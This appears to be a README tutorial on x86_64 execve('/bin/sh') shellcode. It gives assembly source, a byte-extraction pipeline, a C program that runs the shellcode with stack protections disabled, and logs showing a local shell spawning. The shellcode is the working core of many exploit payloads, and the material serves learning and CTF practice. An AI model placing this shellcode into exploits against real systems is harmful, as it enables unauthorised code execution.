# Execve Syscall Technique (Gaining Shell)

The `execve` syscall is a low-level technique used to spawn a shell by directly interacting with the Linux kernel. This method bypasses standard libraries and executes `/bin/sh` by invoking `execve("/bin/sh", NULL, NULL)`. It's a common approach in exploit development and shellcode crafting, often used in Capture The Flag (CTF) challenges, red teaming, and post-exploitation scenarios.

This repository contains minimal examples in C and Assembly to demonstrate how syscall-level shell spawning works and why understanding such techniques is important in modern cybersecurity practices.

---

## üîç How It Works

- The Linux system call number for `execve` is typically `59` on x86_64.
- The syscall takes three arguments:
  - `const char *filename` ‚Üí path to binary (`/bin/sh`)
  - `char *const argv[]` ‚Üí arguments (can be NULL for simple shells)
  - `char *const envp[]` ‚Üí environment variables (can also be NULL)

By preparing the correct values in registers and invoking the syscall interrupt (`syscall` on x86_64, `int 0x80` on x86), a new shell process is spawned.

---

## üõ†Ô∏è Requirements

- Linux OS (preferably Debian/Ubuntu or Kali)
- GCC or NASM (for compiling C or Assembly)
```
sudo apt update
sudo apt install nasm
```

- Basic understanding of Linux system calls and syscall registers

---

c program:
```c
#include <stdio.h>
#include <string.h>

int main() {

	unsigned char shellcode[] = "\x48\x31\xc0\x50\x48\x89\xe2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05";
	printf("shellcode length: %zu\n", strlen((const char*)shellcode));
	int (*ret)() = (int(*)())shellcode;
	ret();
}
```

---

## üß¨ String Encoding Example (For Shellcode)

- The string "/bin/sh" is reversed and then encoded in hexadecimal for use in memory-safe or register-safe environments. 
- This is often seen in Assembly-based exploits, where certain characters (like null bytes) must be avoided.

```python
python2
Python 2.7.18 (v2.7.18:8d21aa21f2, Apr 19 2020, 20:48:48) 
[GCC 4.2.1 Compatible Apple LLVM 6.0 (clang-600.0.57)] on darwin
Type "help", "copyright", "credits" or "license" for more information.
>>> string = '//bin/sh'
>>> string
'//bin/sh'
>>> encode_string = string[::-1].encode('hex')
>>> encode_string
'68732f6e69622f2f'
>>> 
```


## What‚Äôs Happening?

- string[::-1]: Reverses the string to hs/nib//.
- This is because in Assembly (especially on x86), strings are often pushed to the stack in reverse order to appear correctly in memory.
- .encode('hex'): Converts the reversed string into its hexadecimal byte representation, which is easier to load into registers or memory during exploit development.
    
---

## üßµ Shellcode Walkthrough (Assembly - execve) execve.asm

```asm
global _start
section .text

_start:
    xor rax, rax              ; Clear rax (rax = 0)
    push rax                  ; Push NULL (null terminator for string)
    mov rdx, rsp              ; Set rdx (envp) = NULL

    mov rbx, 0x68732f6e69622f2f  ; Load "//bin/sh" in reverse (little-endian)
    push rbx                  ; Push string onto the stack

    mov rdi, rsp              ; Set rdi = pointer to "/bin/sh"
    push rax                  ; Push NULL (argv terminator)
    push rdi                  ; Push pointer to "/bin/sh" into argv
    mov rsi, rsp              ; Set rsi = argv (["/bin/sh", NULL])

    add rax, 59               ; Syscall number for execve (59)
    syscall                   ; Trigger syscall: execve("/bin/sh", argv, envp)

```

---

| Instruction                   | Description                                                       |
| ----------------------------- | ----------------------------------------------------------------- |
| `xor rax, rax`                | Clears the `rax` register. Used to push NULL and prepare syscall. |
| `push rax`                    | Pushes a NULL terminator onto the stack (`\x00`).                 |
| `mov rdx, rsp`                | Sets `rdx` to point to NULL ‚Üí the `envp` argument of `execve`.    |
| `mov rbx, 0x68732f6e69622f2f` | Loads the reversed hex for `//bin/sh` into `rbx`.                 |
| `push rbx`                    | Places the `//bin/sh` string on the stack.                        |
| `mov rdi, rsp`                | `rdi` now points to the `/bin/sh` string.                         |
| `push rax`                    | NULL terminator for `argv`.                                       |
| `push rdi`                    | Push pointer to `/bin/sh` into the stack to build `argv`.         |
| `mov rsi, rsp`                | `rsi` now points to `argv` ‚Üí `["/bin/sh", NULL]`.                 |
| `add rax, 59`                 | Sets `rax = 59`, which is the syscall number for `execve`.        |
| `syscall`                     | Executes the syscall ‚Üí spawns a shell.                            |


---

## üí° Why Use //bin/sh Instead of /bin/sh?

Using //bin/sh instead of /bin/sh has no effect on the functionality in Unix-like systems, but it allows the string to be aligned perfectly into 8 bytes and avoids null bytes (\x00). This is a common trick in shellcode crafting to keep the payload compact and safe for injection.

---


## Compiling Assembly

```bash
lynk@Linux ~/a/execve-syscall> nasm -f elf64 execve.asm -o execve.o
lynk@Linux ~/a/execve-syscall> ld execve.o -o execve
lynk@Linux ~/a/execve-syscall> ./execve 
$ 

```
---


## now we will convert this into shell code:

```bash
lynk@Linux ~/a/execve-syscall> ls
a.out*  bash*  bash-shell.c  execve*  execve.asm  execve.o  r.md  sysinfo.c
lynk@Linux ~/a/execve-syscall> objdump -M intel -D execve | grep '[0-9a-f]:' | grep -v 'file' | cut -f2 -d: | cut -f1-7 -d' ' | tr -s ' ' | tr '\t' ' ' | sed 's/ $//g' | sed 's/ /\\\x/g' | paste -d '' -s
\x48\x31\xc0\x50\x48\x89\xe2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05
lynk@Linux ~/a/execve-syscall> 

```

```\x48\x31\xc0\x50\x48\x89\xe2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05```

```objdump -M intel -D execve | grep '[0-9a-f]:' | grep -v 'file' | cut -f2 -d: | cut -f1-7 -d' ' | tr -s ' ' | tr '\t' ' ' | sed 's/ $//g' | sed 's/ /\\\x/g' | paste -d '' -s```


---

## üß® Shellcode Execution in C
The following C program demonstrates how to execute raw shellcode that invokes the execve("/bin/sh", NULL, NULL) syscall. The shellcode is written in x86_64 machine code and stored as a string of hex bytes.

```c
#include <stdio.h>
#include <string.h>

int main() {

	unsigned char shellcode[] = "\x48\x31\xc0\x50\x48\x89\xe2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05";
	printf("shellcode length: %zu\n", strlen((const char*)shellcode));
	int (*ret)() = (int(*)())shellcode;
	ret();
}


```
---

## üîç How It Works:

- The shellcode constructs the "/bin/sh" string on the stack.

- It sets up the required arguments for the execve syscall (rax = 59, rdi = /bin/sh, rsi = NULL, rdx = NULL).

- The syscall instruction then executes /bin/sh.

---


## Now we will compile and run it........

```bash
lynk@Linux ~/a/execve-syscall> ls
bash*  bash-shell.c  execve*  execve.asm  execve.o  execve-shell.c  r.md  sysinfo.c
lynk@Linux ~/a/execve-syscall> gcc -fno-stack-protector -z execstack execve-shell.c
lynk@Linux ~/a/execve-syscall> ls
a.out*  bash*  bash-shell.c  execve*  execve.asm  execve.o  execve-shell.c  r.md  sysinfo.c
lynk@Linux ~/a/execve-syscall> ./a.out 
shellcode length: 32
$ whoami
lynk
$ 

```
## Bang it worked............Some how............................;)

